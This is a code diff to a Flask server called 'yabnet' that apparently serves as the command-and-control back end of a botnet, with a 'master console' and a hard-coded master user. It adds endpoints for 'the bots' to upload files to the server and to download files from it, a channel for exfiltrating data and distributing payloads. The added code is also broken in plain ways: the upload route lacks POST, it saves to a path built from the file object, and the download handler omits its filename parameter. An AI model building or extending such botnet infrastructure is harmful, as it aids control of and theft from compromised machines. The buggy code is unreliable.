@@ -1,4 +1,6 @@
-from flask import Flask, url_for, request, redirect, jsonify, render_template, session 
+import os 
+
+from flask import Flask, url_for, request, redirect, jsonify, render_template, session, send_from_directory 
 from flask_sqlalchemy import SQLAlchemy
 from datetime import datetime  
 
@@ -17,8 +19,13 @@ Also takes are of master console's request/response.
 app = Flask(__name__)
 app.config['DEBUG'] = True
 app.config['SQLALCHEMY_DATABASE_URI'] = 'sqlite:///yabnet.sqlite3'
+app.config['UPLOAD_FOLDER'] = '/opt/yabnet/uploads'
 db.app = app
 db.init_app(app)
+
+UPLOAD_DIRECTORY="/opt/yabnet/uploads"
+if not os.path.exists(UPLOAD_DIRECTORY):
+    os.makedirs(UPLOAD_DIRECTORY)
 
 # Users - CHANGE ME for operation!! 
 MASTERNAME = 'u'
@@ -432,6 +439,37 @@ def broadcast():
 # TODO: filer endpoint? Or just expand list endpoint to filter 
 # based on the POST request parameters ('find') ? 
 
+# This is for testing purposes 
+@app.route('/files')
+def list_files():
+    files = [] 
+    for item in os.listdir(UPLOAD_DIRECTORY):
+        path = os.path.join(UPLOAD_DIRECTORY, item)
+        if os.path.isfile(path):
+            files.append(item)
+    
+    return jsonify(files)
+
+@app.route('/upload')
+def upload_file():
+    """
+    Description: File upload endpoint for the bots 
+    """
+    uploaded_file = request.files['file']
+
+    try:
+        uploaded_file.save(os.path.join(app.config['UPLOAD_FOLDER'], uploaded_file))
+    except Exception as e:
+        return jsonify({'error': str(e)})
+    
+    return jsonify({'success': '[DEBUG] File has been uploaded'})
+
+@app.route('/download/<filename>')
+def download_file():
+    """
+    Description: File download endpoint for the bots to visit and download specific files
+    """
+    return send_from_directory(app.config['UPLOAD_FOLDER'], filename)
 
 
 
